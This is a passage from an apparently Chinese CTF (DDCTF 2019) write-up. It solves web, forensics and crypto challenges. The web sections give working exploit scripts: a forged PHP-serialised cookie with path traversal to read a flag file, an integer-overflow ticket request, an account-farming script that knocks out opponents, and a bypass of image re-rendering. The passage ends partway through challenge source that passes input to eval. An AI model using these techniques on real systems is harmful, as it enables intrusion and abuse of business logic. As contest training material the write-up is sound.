<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">header = &#123;<span class="string">'didictf_username'</span>:<span class="string">'admin'</span>&#125;</span><br><span class="line"><span class="comment">#cookies = &#123;'ddctf_id':'a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%22e4b66689ce408335068bd8b5a7c6bd92%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A15%3A%22219.218.130.178%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A82%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10.13%3B+rv%3A66.0%29+Gecko%2F20100101+Firefox%2F66.0%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D13f4f1b110d5b22d052004531ac44816'&#125;</span></span><br><span class="line">cookies = &#123;<span class="string">'ddctf_id'</span>:<span class="string">'O%3A11%3A%22Application%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A21%3A%22...%2F.%2Fconfig%2Fflag.txt%22%3B%7D5a014dbe49334e6dbb7326046950bee2'</span>&#125;</span><br><span class="line">data = &#123;<span class="string">'nickname'</span>:<span class="string">'%s'</span>&#125;</span><br><span class="line">res = s.post(<span class="string">'http://117.51.158.44/app/Session.php'</span>,headers=header,cookies=cookies,data=data)</span><br><span class="line"><span class="keyword">print</span> res.text</span><br></pre></td></tr></table></figure>
<p>flag</p>
<p><code>DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}</code></p>
<hr>
<h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>上传 jpg 图片显示 <code>[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()</code></p>
<p>推测要二次渲染绕过</p>
<p>使用 <a href="https://gist.github.com/virink/0f184d20ef9f9d92cfcbc656c56e6738" target="_blank" rel="noopener">https://gist.github.com/virink/0f184d20ef9f9d92cfcbc656c56e6738</a> 这个 php 脚本生成含 phpinfo() 的 jpg</p>
<p>这题要多试几次，先上传， 再下载，脚本处理后再上传、下载</p>
<p>如此反复多次得到 flag</p>
<p><img src="https://i.loli.net/2019/04/13/5cb187f2298d7.png" alt></p>
<hr>
<p>##大吉大利,今晚吃鸡~</p>
<p>抓包分析发现传入 ticket_price 可控</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /ctf/api/buy_ticket?ticket_price=2000 HTTP/1.1</span><br><span class="line">Host: 117.51.147.155:5050</span><br><span class="line">Accept: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36</span><br><span class="line">Referer: http://117.51.147.155:5050/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: user_name=1q123; REVEL_SESSION=3dff7d284606b58024a5a3ca60ad6906</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<p>利用 unsigned int 整数溢出，能买到一张入场券</p>
<p><img src="https://i.loli.net/2019/04/14/5cb31665886cf.png" alt></p>
<p>进入游戏发现需要知道其他账号的 id 和 ticket 才能移除对手</p>
<p>写脚本不断注册、买入场券，获取其 id 和 ticket，然后用自己的号将其移除</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">ids = []</span><br><span class="line">tickets = []</span><br><span class="line"></span><br><span class="line">m_cookie = &#123;<span class="string">'user_name'</span>:<span class="string">'admin300'</span>,<span class="string">'REVEL_SESSION'</span>:<span class="string">'f59f3d9307f44dd5f6cb2ba44d45544d'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">200</span>):</span><br><span class="line">	s = requests.Session()</span><br><span class="line">	username = <span class="string">"adminnnnsssss"</span>+str(i)</span><br><span class="line">	url  = <span class="string">'http://117.51.147.155:5050/ctf/api/register?name=&#123;&#125;&amp;password=qqqqqqqq'</span>.format(username)</span><br><span class="line">	b_url = <span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"</span></span><br><span class="line">	<span class="keyword">print</span> (url)</span><br><span class="line">	c = s.get(url).cookies</span><br><span class="line">	cookie = &#123;<span class="string">'user_name'</span>:username,<span class="string">'REVEL_SESSION'</span>:c[<span class="string">'REVEL_SESSION'</span>]&#125;</span><br><span class="line">	br = s.get(b_url,cookies=cookie)</span><br><span class="line">	buy_json = br.text</span><br><span class="line">	tic = re.findall(<span class="string">r'"bill_id":"(.*?)"'</span>,buy_json)[<span class="number">0</span>]</span><br><span class="line">	pay_url = <span class="string">'http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id='</span>+tic</span><br><span class="line">	pay_res = s.get(pay_url,cookies=cookie)</span><br><span class="line">	res_url = <span class="string">"http://117.51.147.155:5050/ctf/api/search_ticket"</span></span><br><span class="line">	res = s.get(res_url,cookies=cookie)</span><br><span class="line">	iid =  re.findall(<span class="string">r'"id":(.*?),"ticket":".*?"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">	ticket =  re.findall(<span class="string">r'"id":.*?,"ticket":"(.*?)"'</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">	ids.append(iid)</span><br><span class="line">	tickets.append(ticket)</span><br><span class="line">	<span class="keyword">print</span> iid </span><br><span class="line">	<span class="keyword">print</span> ticket</span><br><span class="line">	re_url = <span class="string">'http://117.51.147.155:5050/ctf/api/remove_robot?id=&#123;&#125;&amp;ticket=&#123;&#125;'</span>.format(iid,ticket)</span><br><span class="line">	sss = requests.get(re_url,cookies=m_cookie).text</span><br><span class="line">	<span class="keyword">print</span> sss</span><br></pre></td></tr></table></figure>
<p>吃鸡</p>
<p><img src="https://i.loli.net/2019/04/14/5cb31612c7e6e.png" alt></p>
<hr>
<h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>Wireshark 导出 HTTP 对象</p>
<p>发现到处的文件中有两张图和一个解密网站 html</p>
<p>导出 png 图片，其中一张高度改 800 得到 key: xS8niJM7</p>
<p><a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a>解密</p>
<p>得到隐藏信息：</p>
<p><img src="https://i.loli.net/2019/04/12/5cb09f797c2cc.png" alt></p>
<p>转16进制得到 flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 44444354467B4E62756942556C52356C687777324F6670456D75655A6436344F6C524A3144327D | xxd -r -p</span><br><span class="line">DDCTF&#123;NbuiBUlR5lhww2OfpEmueZd64OlRJ1D2&#125;⏎</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h2><p>有关 Shamir’s Secret Sharing</p>
<p><a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing</a></p>
<p>参考这篇文章的代码，<a href="http://mslc.ctf.su/wp/plaidctf-2012-nuclear-launch-detected-150-password-guessing/" target="_blank" rel="noopener">http://mslc.ctf.su/wp/plaidctf-2012-nuclear-launch-detected-150-password-guessing/</a></p>
<p>先把第一组的1，2，4解出，再把第二组的3，4，5解出，最后利用得到的两个数据解出明文</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xC45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627E3ED40FBDE968251984513ACC2B627B4A483A6533</span></span><br><span class="line"></span><br><span class="line">pairs1 = []</span><br><span class="line">pairs1 += [(<span class="number">1</span>, <span class="number">0x729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB1777357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E</span>)]</span><br><span class="line">pairs1 += [(<span class="number">2</span>, <span class="number">0x478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6</span>)]</span><br><span class="line">pairs1 += [(<span class="number">4</span>, <span class="number">0xBFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D</span>)]</span><br><span class="line"></span><br><span class="line">pairs2 = []</span><br><span class="line">pairs2 += [(<span class="number">3</span>, <span class="number">0x9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A0A494BE36CEF44ADE376317E7A0C70633E3091A61</span>)]</span><br><span class="line">pairs2 += [(<span class="number">4</span>, <span class="number">0x79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393FC7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8</span>)]</span><br><span class="line">pairs2 += [(<span class="number">5</span>, <span class="number">0x2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472444A3CE2368E5A6EBF96603B3CD10EAE858150510</span>)]</span><br><span class="line"></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sss</span><span class="params">(p,pairs,res)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, pair <span class="keyword">in</span> enumerate(pairs):</span><br><span class="line">        x, y = pair</span><br><span class="line">        top = <span class="number">1</span></span><br><span class="line">        bottom = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j, pair <span class="keyword">in</span> enumerate(pairs):</span><br><span class="line">            <span class="keyword">if</span> j == i:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            xj, yj = pair</span><br><span class="line">            top = (top * (-xj)) % p</span><br><span class="line">            bottom = (bottom * (x - xj)) % p</span><br><span class="line">        res += (y * top * invmod(bottom, p)) % p</span><br><span class="line">        res %= p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p31 = (<span class="number">1</span>,sss(p,pairs1,res))</span><br><span class="line">p32 = (<span class="number">2</span>,sss(p,pairs2,res))</span><br><span class="line"></span><br><span class="line">pairs3 = [p31,p32]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> n2s(sss(p,pairs3,res))</span><br></pre></td></tr></table></figure>
<p>运行脚本得到 flag</p>
<p><code>DDCTF{vF22holF5hl5q0WmrFZ5kZ1DBdWOGObk}</code></p>
<hr>
<h2 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h2><p>下载保存后使用 xortool </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xortool -x xx.txt -o</span><br><span class="line">cat ./* | grep DD</span><br></pre></td></tr></table></figure>
<p>flag</p>
<p><code>DDCTF{b5f49e210662301ac0f6f3a6526106f1}</code></p>
<hr>
<h2 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h2><p>图片最低位提取 7SsQWmZ524i/yVWoMeAIJA==</p>
<p>aes 解密</p>
<p><a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">http://tool.chacuo.net/cryptaes</a></p>
<p>密钥是 ：weigongcun</p>
<p>DDCTF{Q*2!x@B0}</p>
<hr>
<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5afe1f66147e857'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">	session[<span class="string">'log'</span>].append(event)</span><br><span class="line">	<span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">	<span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">		request.event_queue += event</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">	haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">	<span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">		haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">	<span class="keyword">return</span> haystack</span><br><span class="line">	</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">	valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">	resp = <span class="literal">None</span></span><br><span class="line">	<span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">		event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">		request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">			<span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">			action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">			args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">				ret_val = event_handler(args)</span><br><span class="line">			<span class="keyword">except</span> RollBackException:</span><br><span class="line">				<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">				resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">				resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">				session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">				session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">except</span> Exception, e:</span><br><span class="line">				<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">				<span class="comment">#resp += str(e) # only for debugging</span></span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">				<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line">				<span class="keyword">else</span>: resp += ret_val</span><br><span class="line">	<span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">	session.modified = <span class="literal">True</span></span><br><span class="line">	<span class="keyword">return</span> resp</span><br><span class="line">	</span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">	querystring = urllib.unquote(request.query_string)</span><br><span class="line">	request.event_queue = []</span><br><span class="line">	<span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">		querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">		session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">		session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">		session[<span class="string">'log'</span>] = []</span><br><span class="line">	request.prev_session = dict(session)</span><br><span class="line">	trigger_event(querystring)</span><br><span class="line">	<span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	page = args[<span class="number">0</span>]</span><br><span class="line">	html = <span class="string">''</span></span><br><span class="line">	html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">	<span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">	<span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">		html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">	<span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">		<span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">		html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">	html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">	<span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">	bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line">	</span><br><span class="line">		source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">		html = <span class="string">''</span></span><br><span class="line">		<span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">			html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">			html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">			</span><br><span class="line">		<span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">			<span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">				html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				html += line</span><br><span class="line">		source.close()</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">			headers = &#123;&#125;</span><br><span class="line">			headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">			headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">			<span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">return</span> html</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	num_items = int(args[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">	session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">	trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">	point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">	session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">	flag = args[<span class="number">0</span>]</span><br><span class="line">	<span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> session[<span 